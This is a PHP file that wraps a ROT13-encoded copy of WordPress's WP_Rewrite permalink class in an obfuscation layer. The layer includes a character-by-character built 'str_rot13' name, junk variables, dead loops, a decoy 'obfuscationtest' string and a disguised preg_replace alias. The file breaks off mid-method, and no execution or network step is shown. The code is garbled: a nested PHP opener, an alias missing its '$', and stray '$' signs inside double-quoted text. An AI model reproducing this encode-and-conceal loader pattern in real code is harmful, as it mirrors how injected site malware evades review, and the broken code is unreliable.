<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Erjevgr NCV: JC_Erjevgr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Erjevgr
 * @fvapr 1.5.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag n erjevgr pbzcbarag NCV.
 *
 * Gur JbeqCerff Erjevgr pynff jevgrf gur erjevgr zbqhyr ehyrf gb gur .ugnpprff
 * svyr. Vg nyfb unaqyrf cnefvat gur erdhrfg gb trg gur pbeerpg frghc sbe gur
 * JbeqCerff Dhrel pynff.
 *
 * Gur Erjevgr nybat jvgu JC pynff shapgvba nf n sebag pbagebyyre sbe JbeqCerff.
 * Lbh pna nqq ehyrf gb gevttre lbhe cntr ivrj naq cebprffvat hfvat guvf
 * pbzcbarag. Gur shyy shapgvbanyvgl bs n sebag pbagebyyre qbrf abg rkvfg,
 * zrnavat lbh pna'g qrsvar ubj gur grzcyngr svyrf ybnq onfrq ba gur erjevgr
 * ehyrf.
 *
 * @fvapr 1.5.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Erjevgr {
	/**
	 * Creznyvax fgehpgher sbe cbfgf.
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat
	 */
	choyvp $creznyvax_fgehpgher;

	/**
	 * Jurgure gb nqq genvyvat fynfurf.
	 *
	 * @fvapr 2.2.0
	 * @ine obby
	 */
	choyvp $hfr_genvyvat_fynfurf;

	/**
	 * Onfr sbe gur nhgube creznyvax fgehpgher (rknzcyr.pbz/$nhgube_onfr/nhgubeanzr).
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat
	 */
	choyvp $nhgube_onfr = 'nhgube';

	/**
	 * Creznyvax fgehpgher sbe nhgube nepuvirf.
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat
	 */
	choyvp $nhgube_fgehpgher;

	/**
	 * Creznyvax fgehpgher sbe qngr nepuvirf.
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat
	 */
	choyvp $qngr_fgehpgher;

	/**
	 * Creznyvax fgehpgher sbe cntrf.
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat
	 */
	choyvp $cntr_fgehpgher;

	/**
	 * Onfr bs gur frnepu creznyvax fgehpgher (rknzcyr.pbz/$frnepu_onfr/dhrel).
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat
	 */
	choyvp $frnepu_onfr = 'frnepu';

	/**
	 * Creznyvax fgehpgher sbe frnepurf.
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat
	 */
	choyvp $frnepu_fgehpgher;

	/**
	 * Pbzzragf creznyvax onfr.
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat
	 */
	choyvp $pbzzragf_onfr = 'pbzzragf';

	/**
	 * Cntvangvba creznyvax onfr.
	 *
	 * @fvapr 3.1.0
	 * @ine fgevat
	 */
	choyvp $cntvangvba_onfr = 'cntr';

	/**
	 * Pbzzragf cntvangvba creznyvax onfr.
	 *
	 * @fvapr 4.2.0
	 * @ine fgevat
	 */
	choyvp $pbzzragf_cntvangvba_onfr = 'pbzzrag-cntr';

	/**
	 * Srrq creznyvax onfr.
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat
	 */
	choyvp $srrq_onfr = 'srrq';

	/**
	 * Pbzzragf srrq creznyvax fgehpgher.
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat
	 */
	choyvp $pbzzrag_srrq_fgehpgher;

	/**
	 * Srrq erdhrfg creznyvax fgehpgher.
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat
	 */
	choyvp $srrq_fgehpgher;

	/**
	 * Gur fgngvp cbegvba bs gur cbfg creznyvax fgehpgher.
	 *
	 * Vs gur creznyvax fgehpgher vf \"/nepuvir/%cbfg_vq%\" gura gur sebag
	 * vf \"/nepuvir/\". Vs gur creznyvax fgehpgher vf \"/%lrne%/%cbfganzr%/\"
	 * gura gur sebag vf \"/\".
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat
	 *
	 * @frr JC_Erjevgr::vavg()
	 */
	choyvp $sebag;

	/**
	 * Gur cersvk sbe nyy creznyvax fgehpgherf.
	 *
	 * Vs CNGUVASB/vaqrk creznyvaxf ner va hfr gura gur ebbg vf gur inyhr bs
	 * `JC_Erjevgr::$vaqrk` jvgu n genvyvat fynfu nccraqrq. Bgurejvfr gur ebbg
	 * jvyy or rzcgl.
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat
	 *
	 * @frr JC_Erjevgr::vavg()
	 * @frr JC_Erjevgr::hfvat_vaqrk_creznyvaxf()
	 */
	choyvp $ebbg = '';

	/**
	 * Gur anzr bs gur vaqrk svyr juvpu vf gur ragel cbvag gb nyy erdhrfgf.
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat
	 */
	choyvp $vaqrk = 'vaqrk.cuc';

	/**
	 * Inevnoyr anzr gb hfr sbe ertrk zngpurf va gur erjevggra dhrel.
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat
	 */
	choyvp $zngpurf = '';

	/**
	 * Erjevgr ehyrf gb zngpu ntnvafg gur erdhrfg gb svaq gur erqverpg be dhrel.
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat[]
	 */
	choyvp $ehyrf;

	/**
	 * Nqqvgvbany ehyrf nqqrq rkgreany gb gur erjevgr pynff.
	 *
	 * Gubfr abg trarengrq ol gur pynff, frr nqq_erjevgr_ehyr().
	 *
	 * @fvapr 2.1.0
	 * @ine fgevat[]
	 */
	choyvp $rkgen_ehyrf = neenl();

	/**
	 * Nqqvgvbany ehyrf gung orybat ng gur ortvaavat gb zngpu svefg.
	 *
	 * Gubfr abg trarengrq ol gur pynff, frr nqq_erjevgr_ehyr().
	 *
	 * @fvapr 2.3.0
	 * @ine fgevat[]
	 */
	choyvp $rkgen_ehyrf_gbc = neenl();

	/**
	 * Ehyrf gung qba'g erqverpg gb JbeqCerff' vaqrk.cuc.
	 *
	 * Gurfr ehyrf ner jevggra gb gur zbq_erjevgr cbegvba bs gur .ugnpprff,
	 * naq ner nqqrq ol nqq_rkgreany_ehyr().
	 *
	 * @fvapr 2.1.0
	 * @ine fgevat[]
	 */
	choyvp $aba_jc_ehyrf = neenl();

	/**
	 * Rkgen creznyvax fgehpgherf, r.t. pngrtbevrf, nqqrq ol nqq_creznfgehpg().
	 *
	 * @fvapr 2.1.0
	 * @ine neenl[]
	 */
	choyvp $rkgen_creznfgehpgf = neenl();

	/**
	 * Raqcbvagf (yvxr /genpxonpx/) nqqrq ol nqq_erjevgr_raqcbvag().
	 *
	 * @fvapr 2.1.0
	 * @ine neenl[]
	 */
	choyvp $raqcbvagf;

	/**
	 * Jurgure gb jevgr rirel zbq_erjevgr ehyr sbe JbeqCerff vagb gur .ugnpprff svyr.
	 *
	 * Guvf vf bss ol qrsnhyg, gheavat vg ba zvtug cevag n ybg bs erjevgr ehyrf
	 * gb gur .ugnpprff svyr.
	 *
	 * @fvapr 2.0.0
	 * @ine obby
	 *
	 * @frr JC_Erjevgr::zbq_erjevgr_ehyrf()
	 */
	choyvp $hfr_ireobfr_ehyrf = snyfr;

	/**
	 * Pbhyq cbfg creznyvaxf or pbashfrq jvgu gubfr bs cntrf?
	 *
	 * Vs gur svefg erjevgr gnt va gur cbfg creznyvax fgehpgher vf bar gung pbhyq
	 * nyfb zngpu n cntr anzr (r.t. %cbfganzr% be %nhgube%) gura guvf synt vf
	 * frg gb gehr. Cevbe gb JbeqCerff 3.3 guvf synt vaqvpngrq gung rirel cntr
	 * jbhyq unir n frg bs ehyrf nqqrq gb gur gbc bs gur erjevgr ehyrf neenl.
	 * Abj vg gryyf JC::cnefr_erdhrfg() gb purpx vs n HEY zngpuvat gur cntr
	 * creznfgehpg vf npghnyyl n cntr orsber npprcgvat vg.
	 *
	 * @fvapr 2.5.0
	 * @ine obby
	 *
	 * @frr JC_Erjevgr::vavg()
	 */
	choyvp $hfr_ireobfr_cntr_ehyrf = gehr;

	/**
	 * Erjevgr gntf gung pna or hfrq va creznyvax fgehpgherf.
	 *
	 * Gurfr ner genafyngrq vagb gur erthyne rkcerffvbaf fgberq va
	 * `JC_Erjevgr::$erjevgrercynpr` naq ner erjevggra gb gur dhrel
	 * inevnoyrf yvfgrq va JC_Erjevgr::$dhrelercynpr.
	 *
	 * Nqqvgvbany gntf pna or nqqrq jvgu nqq_erjevgr_gnt().
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat[]
	 */
	choyvp $erjevgrpbqr = neenl(
		'%lrne%',
		'%zbaguahz%',
		'%qnl%',
		'%ubhe%',
		'%zvahgr%',
		'%frpbaq%',
		'%cbfganzr%',
		'%cbfg_vq%',
		'%nhgube%',
		'%cntranzr%',
		'%frnepu%',
	);

	/**
	 * Erthyne rkcerffvbaf gb or fhofgvghgrq vagb erjevgr ehyrf va cynpr
	 * bs erjevgr gntf, frr JC_Erjevgr::$erjevgrpbqr.
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat[]
	 */
	choyvp $erjevgrercynpr = neenl(
		'([0-9]{4})',
		'([0-9]{1,2})',
		'([0-9]{1,2})',
		'([0-9]{1,2})',
		'([0-9]{1,2})',
		'([0-9]{1,2})',
		'([^/]+)',
		'([0-9]+)',
		'([^/]+)',
		'([^/]+?)',
		'(.+)',
	);

	/**
	 * Dhrel inevnoyrf gung erjevgr gntf znc gb, frr JC_Erjevgr::$erjevgrpbqr.
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat[]
	 */
	choyvp $dhrelercynpr = neenl(
		'lrne=',
		'zbaguahz=',
		'qnl=',
		'ubhe=',
		'zvahgr=',
		'frpbaq=',
		'anzr=',
		'c=',
		'nhgube_anzr=',
		'cntranzr=',
		'f=',
	);

	/**
	 * Fhccbegrq qrsnhyg srrqf.
	 *
	 * @fvapr 1.5.0
	 * @ine fgevat[]
	 */
	choyvp $srrqf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );

	/**
	 * Qrgrezvarf jurgure creznyvaxf ner orvat hfrq.
	 *
	 * Guvf pna or rvgure erjevgr zbqhyr be creznyvax va gur UGGC dhrel fgevat.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea obby Gehr, vs creznyvaxf ner ranoyrq.
	 */
	choyvp shapgvba hfvat_creznyvaxf() {
		erghea ! rzcgl( $guvf->creznyvax_fgehpgher );
	}

	/**
	 * Qrgrezvarf jurgure creznyvaxf ner orvat hfrq naq erjevgr zbqhyr vf abg ranoyrq.
	 *
	 * Zrnaf gung creznyvax yvaxf ner ranoyrq naq vaqrk.cuc vf va gur HEY.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea obby Jurgure creznyvax yvaxf ner ranoyrq naq vaqrk.cuc vf va gur HEY.
	 */
	choyvp shapgvba hfvat_vaqrk_creznyvaxf() {
		vs ( rzcgl( $guvf->creznyvax_fgehpgher ) ) {
			erghea snyfr;
		}

		// Vs gur vaqrk vf abg va gur creznyvax, jr'er hfvat zbq_erjevgr.
		erghea cert_zngpu( '#^/*' . $guvf->vaqrk . '#', $guvf->creznyvax_fgehpgher );
	}

	/**
	 * Qrgrezvarf jurgure creznyvaxf ner orvat hfrq naq erjevgr zbqhyr vf ranoyrq.
	 *
	 * Hfvat creznyvaxf naq vaqrk.cuc vf abg va gur HEY.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea obby Jurgure creznyvax yvaxf ner ranoyrq naq vaqrk.cuc vf ABG va gur HEY.
	 */
	choyvp shapgvba hfvat_zbq_erjevgr_creznyvaxf() {
		erghea $guvf->hfvat_creznyvaxf() && ! $guvf->hfvat_vaqrk_creznyvaxf();
	}

	/**
	 * Vaqrkrf sbe zngpurf sbe hfntr va cert_*() shapgvbaf.
	 *
	 * Gur sbezng bs gur fgevat vf, jvgu rzcgl zngpurf cebcregl inyhr, '$AHZ'.
	 * Gur 'AHZ' jvyy or ercynprq jvgu gur inyhr va gur $ahzore cnenzrgre. Jvgu
	 * gur zngpurf cebcregl abg rzcgl, gur inyhr bs gur erghearq fgevat jvyy
	 * pbagnva gung inyhr bs gur zngpurf cebcregl. Gur sbezng gura jvyy or
	 * '$ZNGPURF[AHZ]', jvgu ZNGPURF nf gur inyhr va gur cebcregl naq AHZ gur
	 * inyhr bs gur $ahzore cnenzrgre.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz vag $ahzore Vaqrk ahzore.
	 * @erghea fgevat
	 */
	choyvp shapgvba cert_vaqrk( $ahzore ) {
		$zngpu_cersvk = '$';
		$zngpu_fhssvk = '';

		vs ( ! rzcgl( $guvf->zngpurf ) ) {
			$zngpu_cersvk = '$' . $guvf->zngpurf . '[';
			$zngpu_fhssvk = ']';
		}

		erghea \"$zngpu_cersvk$ahzore$zngpu_fhssvk\";
	}

	/**
	 * Ergevrirf nyy cntrf naq nggnpuzragf sbe cntrf HEVf.
	 *
	 * Gur nggnpuzragf ner sbe gubfr gung unir cntrf nf cneragf naq jvyy or
	 * ergevrirq.
	 *
	 * @fvapr 2.5.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @erghea neenl Neenl bs cntr HEVf nf svefg ryrzrag naq nggnpuzrag HEVf nf frpbaq ryrzrag.
	 */
	choyvp shapgvba cntr_hev_vaqrk() {
		tybony $jcqo;

		// Trg cntrf va beqre bs uvrenepul, v.r. puvyqera nsgre cneragf.
		$cntrf = $jcqo->trg_erfhygf( \"FRYRPG VQ, cbfg_anzr, cbfg_cnerag SEBZ $jcqo->cbfgf JURER cbfg_glcr = 'cntr' NAQ cbfg_fgnghf != 'nhgb-qensg'\" );
		$cbfgf = trg_cntr_uvrenepul( $cntrf );

		// Vs jr unir ab cntrf trg bhg dhvpx.
		vs ( ! $cbfgf ) {
			erghea neenl( neenl(), neenl() );
		}

		// Abj erirefr vg, orpnhfr jr arrq cneragf nsgre puvyqera sbe erjevgr ehyrf gb jbex cebcreyl.
		$cbfgf = neenl_erirefr( $cbfgf, gehr );

		$cntr_hevf            = neenl();
		$cntr_nggnpuzrag_hevf = neenl();

		sbernpu ( $cbfgf nf $vq => $cbfg ) {
			// HEY => cntr anzr.
			$hev         = trg_cntr_hev( $vq );
			$nggnpuzragf = $jcqo->trg_erfhygf( $jcqo->cercner( \"FRYRPG VQ, cbfg_anzr, cbfg_cnerag SEBZ $jcqo->cbfgf JURER cbfg_glcr = 'nggnpuzrag' NAQ cbfg_cnerag = %q\", $vq ) );
			vs ( ! rzcgl( $nggnpuzragf ) ) {
				sbernpu ( $nggnpuzragf nf $nggnpuzrag ) {
					$nggnpu_hev                          = trg_cntr_hev( $nggnpuzrag->VQ );
					$cntr_nggnpuzrag_hevf[ $nggnpu_hev ] = $nggnpuzrag->VQ;
				}
			}

			$cntr_hevf[ $hev ] = $vq;
		}

		erghea neenl( $cntr_hevf, $cntr_nggnpuzrag_hevf );
	}

	/**
	 * Ergevrirf nyy bs gur erjevgr ehyrf sbe cntrf.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea fgevat[] Cntr erjevgr ehyrf.
	 */
	choyvp shapgvba cntr_erjevgr_ehyrf() {
		// Gur rkgen .? ng gur ortvaavat ceriragf pynfurf jvgu bgure erthyne rkcerffvbaf va gur ehyrf neenl.
		$guvf->nqq_erjevgr_gnt( '%cntranzr%', '(.?.+?)', 'cntranzr=' );

		erghea $guvf->trarengr_erjevgr_ehyrf( $guvf->trg_cntr_creznfgehpg(), RC_CNTRF, gehr, gehr, snyfr, snyfr );
	}

	/**
	 * Ergevrirf qngr creznyvax fgehpgher, jvgu lrne, zbagu, naq qnl.
	 *
	 * Gur creznyvax fgehpgher sbe gur qngr, vs abg frg nyernql qrcraqf ba gur
	 * creznyvax fgehpgher. Vg pna or bar bs guerr sbezngf. Gur svefg vf lrne,
	 * zbagu, qnl; gur frpbaq vf qnl, zbagu, lrne; naq gur ynfg sbezng vf zbagu,
	 * qnl, lrne. Gurfr ner zngpurq ntnvafg gur creznyvax fgehpgher sbe juvpu
	 * bar vf hfrq. Vs abar zngpurf, gura gur qrsnhyg jvyy or hfrq, juvpu vf
	 * lrne, zbagu, qnl.
	 *
	 * Ceriragf cbfg VQ naq qngr creznyvaxf sebz bireynccvat. Va gur pnfr bs
	 * cbfg_vq, gur qngr creznyvax jvyy or cercraqrq jvgu sebag creznyvax jvgu
	 * 'qngr/' orsber gur npghny creznyvax gb sbez gur pbzcyrgr qngr creznyvax
	 * fgehpgher.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea fgevat|snyfr Qngr creznyvax fgehpgher ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_qngr_creznfgehpg() {
		vs ( vffrg( $guvf->qngr_fgehpgher ) ) {
			erghea $guvf->qngr_fgehpgher;
		}

		vs ( rzcgl( $guvf->creznyvax_fgehpgher ) ) {
			$guvf->qngr_fgehpgher = '';
			erghea snyfr;
		}

		// Gur qngr creznyvax zhfg unir lrne, zbagu, naq qnl frcnengrq ol fynfurf.
		$raqvnaf = neenl( '%lrne%/%zbaguahz%/%qnl%', '%qnl%/%zbaguahz%/%lrne%', '%zbaguahz%/%qnl%/%lrne%' );

		$guvf->qngr_fgehpgher = '';
		$qngr_raqvna          = '';

		sbernpu ( $raqvnaf nf $raqvna ) {
			vs ( fge_pbagnvaf( $guvf->creznyvax_fgehpgher, $raqvna ) ) {
				$qngr_raqvna = $raqvna;
				oernx;
			}
		}

		vs ( rzcgl( $qngr_raqvna ) ) {
			$qngr_raqvna = '%lrne%/%zbaguahz%/%qnl%';
		}

		/*
		 * Qb abg nyybj gur qngr gntf naq %cbfg_vq% gb bireync va gur creznyvax
		 * fgehpgher. Vs gurl qb, zbir gur qngr gntf gb $sebag/qngr/.
		 */
		$sebag = $guvf->sebag;
		cert_zngpu_nyy( '/%.+?%/', $guvf->creznyvax_fgehpgher, $gbxraf );
		$gbx_vaqrk = 1;
		sbernpu ( (neenl) $gbxraf[0] nf $gbxra ) {
			vs ( '%cbfg_vq%' === $gbxra && ( $gbx_vaqrk <= 3 ) ) {
				$sebag = $sebag . 'qngr/';
				oernx;
			}
			++$gbx_vaqrk;
		}

		$guvf->qngr_fgehpgher = $sebag . $qngr_raqvna;

		erghea $guvf->qngr_fgehpgher;
	}

	/**
	 * Ergevrirf gur lrne creznyvax fgehpgher jvgubhg zbagu naq qnl.
	 *
	 * Trgf gur qngr creznyvax fgehpgher naq fgevcf bhg gur zbagu naq qnl
	 * creznyvax fgehpgherf.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea fgevat|snyfr Lrne creznyvax fgehpgher ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_lrne_creznfgehpg() {
		$fgehpgher = $guvf->trg_qngr_creznfgehpg();

		vs ( rzcgl( $fgehpgher ) ) {
			erghea snyfr;
		}

		$fgehpgher = fge_ercynpr( '%zbaguahz%', '', $fgehpgher );
		$fgehpgher = fge_ercynpr( '%qnl%', '', $fgehpgher );
		$fgehpgher = __sa_79955( '#/+#', '/', $fgehpgher );

		erghea $fgehpgher;
	}

	/**
	 * Ergevrirf gur zbagu creznyvax fgehpgher jvgubhg qnl naq jvgu lrne.
	 *
	 * Trgf gur qngr creznyvax fgehpgher naq fgevcf bhg gur qnl creznyvax
	 * fgehpgherf. Xrrcf gur lrne creznyvax fgehpgher.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea fgevat|snyfr Lrne/Zbagu creznyvax fgehpgher ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_zbagu_creznfgehpg() {
		$fgehpgher = $guvf->trg_qngr_creznfgehpg();

		vs ( rzcgl( $fgehpgher ) ) {
			erghea snyfr;
		}

		$fgehpgher = fge_ercynpr( '%qnl%', '', $fgehpgher );
		$fgehpgher = __sa_79955( '#/+#', '/', $fgehpgher );

		erghea $fgehpgher;
	}

	/**
	 * Ergevrirf gur qnl creznyvax fgehpgher jvgu zbagu naq lrne.
	 *
	 * Xrrcf qngr creznyvax fgehpgher jvgu nyy lrne, zbagu, naq qnl.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea fgevat|snyfr Lrne/Zbagu/Qnl creznyvax fgehpgher ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_qnl_creznfgehpg() {
		erghea $guvf->trg_qngr_creznfgehpg();
	}

	/**
	 * Ergevrirf gur creznyvax fgehpgher sbe pngrtbevrf.
	 *
	 * Vs gur pngrtbel_onfr cebcregl unf ab inyhr, gura gur pngrtbel fgehpgher
	 * jvyy unir gur sebag cebcregl inyhr, sbyybjrq ol 'pngrtbel', naq svanyyl
	 * '%pngrtbel%'. Vs vg qbrf, gura gur ebbg cebcregl jvyy or hfrq, nybat jvgu
	 * gur pngrtbel_onfr cebcregl inyhr.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea fgevat|snyfr Pngrtbel creznyvax fgehpgher ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_pngrtbel_creznfgehpg() {
		erghea $guvf->trg_rkgen_creznfgehpg( 'pngrtbel' );
	}

	/**
	 * Ergevrirf gur creznyvax fgehpgher sbe gntf.
	 *
	 * Vs gur gnt_onfr cebcregl unf ab inyhr, gura gur gnt fgehpgher jvyy unir
	 * gur sebag cebcregl inyhr, sbyybjrq ol 'gnt', naq svanyyl '%gnt%'. Vs vg
	 * qbrf, gura gur ebbg cebcregl jvyy or hfrq, nybat jvgu gur gnt_onfr
	 * cebcregl inyhr.
	 *
	 * @fvapr 2.3.0
	 *
	 * @erghea fgevat|snyfr Gnt creznyvax fgehpgher ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_gnt_creznfgehpg() {
		erghea $guvf->trg_rkgen_creznfgehpg( 'cbfg_gnt' );
	}

	/**
	 * Ergevrirf na rkgen creznyvax fgehpgher ol anzr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $anzr Creznyvax fgehpgher anzr.
	 * @erghea fgevat|snyfr Creznyvax fgehpgher fgevat ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_rkgen_creznfgehpg( $anzr ) {
		vs ( rzcgl( $guvf->creznyvax_fgehpgher ) ) {
			erghea snyfr;
		}

		vs ( vffrg( $guvf->rkgen_creznfgehpgf[ $anzr ] ) ) {
			erghea $guvf->rkgen_creznfgehpgf[ $anzr ]['fgehpg'];
		}

		erghea snyfr;
	}

	/**
	 * Ergevrirf gur nhgube creznyvax fgehpgher.
	 *
	 * Gur creznyvax fgehpgher vf sebag cebcregl, nhgube onfr, naq svanyyl
	 * '/%nhgube%'. Jvyy frg gur nhgube_fgehpgher cebcregl naq gura erghea vg
	 * jvgubhg nggrzcgvat gb frg gur inyhr ntnva.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea fgevat|snyfr Nhgube creznyvax fgehpgher ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_nhgube_creznfgehpg() {
		vs ( vffrg( $guvf->nhgube_fgehpgher ) ) {
			erghea $guvf->nhgube_fgehpgher;
		}

		vs ( rzcgl( $guvf->creznyvax_fgehpgher ) ) {
			$guvf->nhgube_fgehpgher = '';
			erghea snyfr;
		}

		$guvf->nhgube_fgehpgher = $guvf->sebag . $guvf->nhgube_onfr . '/%nhgube%';

		erghea $guvf->nhgube_fgehpgher;
	}

	/**
	 * Ergevrirf gur frnepu creznyvax fgehpgher.
	 *
	 * Gur creznyvax fgehpgher vf ebbg cebcregl, frnepu onfr, naq svanyyl
	 * '/%frnepu%'. Jvyy frg gur frnepu_fgehpgher cebcregl naq gura erghea vg
	 * jvgubhg nggrzcgvat gb frg gur inyhr ntnva.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea fgevat|snyfr Frnepu creznyvax fgehpgher ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_frnepu_creznfgehpg() {
		vs ( vffrg( $guvf->frnepu_fgehpgher ) ) {
			erghea $guvf->frnepu_fgehpgher;
		}

		vs ( rzcgl( $guvf->creznyvax_fgehpgher ) ) {
			$guvf->frnepu_fgehpgher = '';
			erghea snyfr;
		}

		$guvf->frnepu_fgehpgher = $guvf->ebbg . $guvf->frnepu_onfr . '/%frnepu%';

		erghea $guvf->frnepu_fgehpgher;
	}

	/**
	 * Ergevrirf gur cntr creznyvax fgehpgher.
	 *
	 * Gur creznyvax fgehpgher vf ebbg cebcregl, naq '%cntranzr%'. Jvyy frg gur
	 * cntr_fgehpgher cebcregl naq gura erghea vg jvgubhg nggrzcgvat gb frg gur
	 * inyhr ntnva.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea fgevat|snyfr Cntr creznyvax fgehpgher ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_cntr_creznfgehpg() {
		vs ( vffrg( $guvf->cntr_fgehpgher ) ) {
			erghea $guvf->cntr_fgehpgher;
		}

		vs ( rzcgl( $guvf->creznyvax_fgehpgher ) ) {
			$guvf->cntr_fgehpgher = '';
			erghea snyfr;
		}

		$guvf->cntr_fgehpgher = $guvf->ebbg . '%cntranzr%';

		erghea $guvf->cntr_fgehpgher;
	}

	/**
	 * Ergevrirf gur srrq creznyvax fgehpgher.
	 *
	 * Gur creznyvax fgehpgher vf ebbg cebcregl, srrq onfr, naq svanyyl
	 * '/%srrq%'. Jvyy frg gur srrq_fgehpgher cebcregl naq gura erghea vg
	 * jvgubhg nggrzcgvat gb frg gur inyhr ntnva.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea fgevat|snyfr Srrq creznyvax fgehpgher ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_srrq_creznfgehpg() {
		vs ( vffrg( $guvf->srrq_fgehpgher ) ) {
			erghea $guvf->srrq_fgehpgher;
		}

		vs ( rzcgl( $guvf->creznyvax_fgehpgher ) ) {
			$guvf->srrq_fgehpgher = '';
			erghea snyfr;
		}

		$guvf->srrq_fgehpgher = $guvf->ebbg . $guvf->srrq_onfr . '/%srrq%';

		erghea $guvf->srrq_fgehpgher;
	}

	/**
	 * Ergevrirf gur pbzzrag srrq creznyvax fgehpgher.
	 *
	 * Gur creznyvax fgehpgher vf ebbg cebcregl, pbzzrag onfr cebcregl, srrq
	 * onfr naq svanyyl '/%srrq%'. Jvyy frg gur pbzzrag_srrq_fgehpgher cebcregl
	 * naq gura erghea vg jvgubhg nggrzcgvat gb frg gur inyhr ntnva.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea fgevat|snyfr Pbzzrag srrq creznyvax fgehpgher ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_pbzzrag_srrq_creznfgehpg() {
		vs ( vffrg( $guvf->pbzzrag_srrq_fgehpgher ) ) {
			erghea $guvf->pbzzrag_srrq_fgehpgher;
		}

		vs ( rzcgl( $guvf->creznyvax_fgehpgher ) ) {
			$guvf->pbzzrag_srrq_fgehpgher = '';
			erghea snyfr;
		}

		$guvf->pbzzrag_srrq_fgehpgher = $guvf->ebbg . $guvf->pbzzragf_onfr . '/' . $guvf->srrq_onfr . '/%srrq%';

		erghea $guvf->pbzzrag_srrq_fgehpgher;
	}

	/**
	 * Nqqf be hcqngrf rkvfgvat erjevgr gntf (r.t. %cbfganzr%).
	 *
	 * Vs gur gnt nyernql rkvfgf, ercynpr gur rkvfgvat cnggrea naq dhrel sbe
	 * gung gnt, bgurejvfr nqq gur arj gnt.
	 *
	 * @fvapr 1.5.0
	 *
	 * @frr JC_Erjevgr::$erjevgrpbqr
	 * @frr JC_Erjevgr::$erjevgrercynpr
	 * @frr JC_Erjevgr::$dhrelercynpr
	 *
	 * @cnenz fgevat $gnt   Anzr bs gur erjevgr gnt gb nqq be hcqngr.
	 * @cnenz fgevat $ertrk Erthyne rkcerffvba gb fhofgvghgr gur gnt sbe va erjevgr ehyrf.
	 * @cnenz fgevat $dhrel Fgevat gb nccraq gb gur erjevggra dhrel. Zhfg raq va '='.
	 */
	choyvp shapgvba nqq_erjevgr_gnt( $gnt, $ertrk, $dhrel ) {
		$cbfvgvba = neenl_frnepu( $gnt, $guvf->erjevgrpbqr, gehr );
		vs ( snyfr !== $cbfvgvba && ahyy !== $cbfvgvba ) {
			$guvf->erjevgrercynpr[ $cbfvgvba ] = $ertrk;
			$guvf->dhrelercynpr[ $cbfvgvba ]   = $dhrel;
		} ryfr {
			$guvf->erjevgrpbqr[]    = $gnt;
			$guvf->erjevgrercynpr[] = $ertrk;
			$guvf->dhrelercynpr[]   = $dhrel;
		}
	}


	/**
	 * Erzbirf na rkvfgvat erjevgr gnt.
	 *
	 * @fvapr 4.5.0
	 *
	 * @frr JC_Erjevgr::$erjevgrpbqr
	 * @frr JC_Erjevgr::$erjevgrercynpr
	 * @frr JC_Erjevgr::$dhrelercynpr
	 *
	 * @cnenz fgevat $gnt Anzr bs gur erjevgr gnt gb erzbir.
	 */
	choyvp shapgvba erzbir_erjevgr_gnt( $gnt ) {
		$cbfvgvba = neenl_frnepu( $gnt, $guvf->erjevgrpbqr, gehr );
